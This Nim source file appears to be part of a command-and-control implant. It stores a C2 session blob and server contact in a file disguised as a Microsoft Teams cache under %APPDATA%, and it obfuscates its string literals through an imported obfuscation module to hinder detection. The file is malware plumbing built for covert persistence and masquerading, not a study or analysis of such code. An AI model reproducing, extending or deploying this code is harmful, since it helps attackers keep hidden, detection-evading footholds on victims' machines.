import std/[os, json, strutils, strformat]
import obfuscation

#################################################################

proc htmlUnescape*(s: string): string =
  result = s
    .replace("&amp;",  "&")
    .replace("&lt;",   "<")
    .replace("&gt;",   ">")
    .replace("&quot;", "\"")
    .replace("&#39;",  "'")
    .replace("&apos;", "'")
    .replace("&#x27;", "'")
    .replace("&#x2F;", "/")
    .replace("&nbsp;", " ")

#################################################################

var gAppdataCachePath = ""

proc getAppdataCachePath*(): string =
  ## Return the path to the AppData cache file (session.dat).
  ## Creates the parent directory if it does not exist.
  ## On Windows: %APPDATA%\Microsoft\Teams\cache\session.dat
  ## On Linux/macOS (dev): ~/.c2session.dat
  if gAppdataCachePath.len > 0:
    return gAppdataCachePath

  var cacheDir: string
  when defined(windows):
    let appdata = getEnv(s("APPDATA"), getHomeDir())
    cacheDir = appdata / s("Microsoft") / s("Teams") / s("cache")
  else:
    cacheDir = getHomeDir()

  try:
    createDir(cacheDir)
  except OSError:
    cacheDir = getHomeDir()

  gAppdataCachePath = cacheDir / s("session.dat")
  return gAppdataCachePath

#################################################################

proc loadLinkFromAppdata*(): JsonNode =
  let path = getAppdataCachePath()
  if not fileExists(path):
    return nil
  try:
    let raw  = readFile(path)
    let data = parseJson(raw)
    if data.kind != JObject:
      return nil
    let urlNode = data.getOrDefault(s("url"))
    if urlNode.kind != JString or urlNode.getStr().len == 0:
      return nil
    # Sanitize: unescape HTML entities that may have been written before the fix.
    # For base64 blobs this is a no-op; for legacy URLs it fixes &amp; corruption.
    data[s("url")] = newJString(htmlUnescape(urlNode.getStr()))
    return data
  except:
    return nil

#################################################################

proc saveLinkToAppdata*(blobB64: string; serverContact: string = "") =
  let path = getAppdataCachePath()

  var contact = serverContact
  if contact.len == 0:
    let existing = loadLinkFromAppdata()
    if existing != nil:
      contact = existing.getOrDefault(s("server_contact")).getStr()

  # Strip whitespace; no HTML-unescaping needed for base64
  let cleanBlob = blobB64.strip()

  let data = %*{s("url"): cleanBlob, s("server_contact"): contact}
  try:
    writeFile(path, $data)
  except OSError as e:
    echo &"[!] Could not save blob to AppData cache: {e.msg}"
